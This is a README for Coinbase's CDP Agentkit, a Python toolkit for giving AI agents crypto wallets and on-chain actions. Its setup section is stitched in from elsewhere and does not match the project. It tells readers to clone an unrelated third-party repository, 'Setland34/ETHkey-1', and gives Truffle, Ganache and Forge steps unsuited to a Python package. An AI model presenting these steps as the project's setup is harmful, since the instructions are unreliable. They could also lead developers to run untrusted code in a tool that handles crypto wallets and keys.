# CDP Agentkit

[![PyPI - Downloads](https://img.shields.io/pypi/dm/cdp-agentkit-core?style=flat-square)](https://pypistats.org/packages/cdp-agentkit-core)
[![GitHub star chart](https://img.shields.io/github/stars/coinbase/cdp-agentkit?style=flat-square)](https://star-history.com/#coinbase/cdp-agentkit)
[![Open Issues](https://img.shields.io/github/issues-raw/coinbase/cdp-agentkit?style=flat-square)](https://github.com/coinbase/cdp-agentkit/issues)

The **Coinbase Developer Platform (CDP) Agentkit for Python** simplifies bringing your AI Agents onchain. Every AI Agent deserves a crypto wallet!

## Table of Contents
- [Key Features](#key-features)
- [Setup and Usage Instructions](#setup-and-usage-instructions)
- [Examples](#examples)
- [Repository Structure](#repository-structure)
- [Contributing](#contributing)
- [Documentation](#documentation)

## Key Features
- **Framework-agnostic**: Common AI Agent primitives that can be used with any AI framework.
- **LangChain integration**: Seamless integration with [LangChain](https://python.langchain.com/docs/introduction/) for easy agentic workflows. More frameworks coming soon!
- **Twitter integration**: Seamless integration of Langchain with [Twitter](https://developer.twitter.com/en/docs/twitter-api) for easy agentic workflows.
- **Support for various on-chain actions**:
  - Faucet for testnet funds
  - Getting wallet details and balances
  - Transferring and trading tokens
  - Registering [Basenames](https://www.base.org/names)
  - Deploying [ERC-20](https://www.coinbase.com/learn/crypto-glossary/what-is-erc-20) tokens
  - Deploying [ERC-721](https://www.coinbase.com/learn/crypto-glossary/what-is-erc-721) tokens and minting NFTs
  - Buying and selling [Zora Wow](https://wow.xyz/) ERC-20 coins
  - Deploying tokens on [Zora's Wow Launcher](https://wow.xyz/mechanics) (Bonding Curve)
  Or [add your own](./CONTRIBUTING.md#adding-an-action-to-agentkit-core)!

## Setup and Usage Instructions

### Prerequisites
Before starting the setup, ensure you have the following tools and versions installed:
- Python 3.10 or higher
- Node.js (v14.x or higher)
- npm (v6.x or higher)
- Truffle (v5.x or higher)
- Ganache CLI (v6.x or higher)

### Cloning the Repository
To clone this repository, use the following command:
```
gh repo clone Setland34/ETHkey-1
```

### Installing Dependencies
To install the necessary dependencies, run the following command:
```
npm install
```

### Development Environment Setup
To set up the development environment, follow these steps:
1. Install Ganache CLI:
   ```
   npm install -g ganache-cli
   ```
2. Install Truffle:
   ```
   npm install -g truffle
   ```
3. Start Ganache CLI:
   ```
   ganache-cli
   ```
4. Compile the smart contracts:
   ```
   truffle compile
   ```
5. Migrate the smart contracts to the development network:
   ```
   truffle migrate --network development
   ```

### Testing Instructions
To run tests for the smart contracts, use the following command:
```
truffle test
```
To run tests with forked mainnet state, use the following command:
```
forge test --fork-url https://eth-sepolia.g.alchemy.com/v2/YOURKEY
```

### Usage Instructions
To interact with the smart contracts using web3.js or ethers.js, follow these examples:

#### Using web3.js
```javascript
const Web3 = require('web3');
const web3 = new Web3('http://localhost:8545');
const contract = new web3.eth.Contract(abi, contractAddress);

// Example function call
contract.methods.exampleFunction().call()
  .then(result => console.log(result))
  .catch(error => console.error(error));
```

#### Using ethers.js
```javascript
const { ethers } = require('ethers');
const provider = new ethers.providers.JsonRpcProvider('http://localhost:8545');
const contract = new ethers.Contract(contractAddress, abi, provider);

// Example function call
contract.exampleFunction()
  .then(result => console.log(result))
  .catch(error => console.error(error));
```

## Examples
Check out [cdp-langchain/examples](./cdp-langchain/examples) for inspiration and help getting started!
- [Chatbot](./cdp-langchain/examples/chatbot/README.md): Simple example of a Chatbot that can perform complex onchain interactions, using OpenAI.

## Repository Structure
CDP Agentkit is organized as a [monorepo](https://en.wikipedia.org/wiki/Monorepo) that contains multiple packages.

### cdp-agentkit-core
Core primitives and framework-agnostic tools that are meant to be composable and used via CDP Agentkit framework extensions (ie, `cdp-langchain`).
See [CDP Agentkit Core](./cdp-agentkit-core/README.md) to get started!

### cdp-langchain
Langchain Toolkit extension of CDP Agentkit. Enables agentic workflows to interact with onchain actions.
See [CDP Langchain](./cdp-langchain/README.md) to get started!

### twitter-langchain
Langchain Toolkit extension for Twitter. Enables agentic workflows to interact with Twitter, such as to post a tweet.
See [Twitter Langchain](./twitter-langchain/README.md) to get started!

## Contributing
CDP Agentkit welcomes community contributions.
See [CONTRIBUTING.md](CONTRIBUTING.md) for more information.

## Documentation
- [CDP Agentkit Documentation](https://docs.cdp.coinbase.com/agentkit/docs/welcome)
- [API Reference: CDP Agentkit Core](https://coinbase.github.io/cdp-agentkit/cdp-agentkit-core/index.html)
- [API Reference: CDP Agentkit LangChain Extension](https://coinbase.github.io/cdp-agentkit/cdp-langchain/index.html)
